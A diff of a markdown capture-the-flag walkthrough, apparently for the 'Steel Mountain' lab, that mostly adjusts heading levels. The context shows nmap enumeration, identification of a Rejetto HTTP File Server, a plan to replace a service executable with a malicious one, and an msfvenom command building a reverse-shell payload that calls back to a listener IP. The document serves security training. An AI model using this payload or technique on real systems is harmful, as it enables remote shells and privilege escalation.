@@ -4,7 +4,7 @@ Directly starting from Task_2.
 
 #### Question:Scan the machine with nmap. What is the other port running a web server on?
 
-### Solution:
+#### Solution:
 
 #### Enumeration Part
 
@@ -17,7 +17,7 @@ Open the link to see the output of nmap:
 ![Alt text](../Screenshots/Steel_Mountain/nmap_output.png)
 
 We can see that http-proxy is running on port 8080. So,
-##### Answer: 8080
+#### Answer: 8080
 
 #### Question: Take a look at the other web server. What file server is running?
 #### Solution:
@@ -29,7 +29,7 @@ I shown up a web page. Where there was a link for http file server as shown in t
 As I clicked, I shown up a page:
 ![Alt text](../Screenshots/Steel_Mountain/service_running.png)
 
-##### Answer: Rejetto http file server
+#### Answer: Rejetto http file server
 
 #### Question:What is the CVE number to exploit this file server?
 #### Solution: 
@@ -71,7 +71,7 @@ Above command will shown up the service that can be exploited, a part of it is s
 
 Now, I am going to replace the actual file with our maclicious file (payload), so when service will start, instead of running legitimate exe file, it will run maclicious file and we will get the root shell.
 
-##### Creating paylod
+#### Creating paylod
 
 using msfconsole, we can make our payload:
 `msfvenom -p windows/shell_reverse_tcp LHOST=10.8.25.176 LPORT=4443 -f exe -o Advanced.exe`
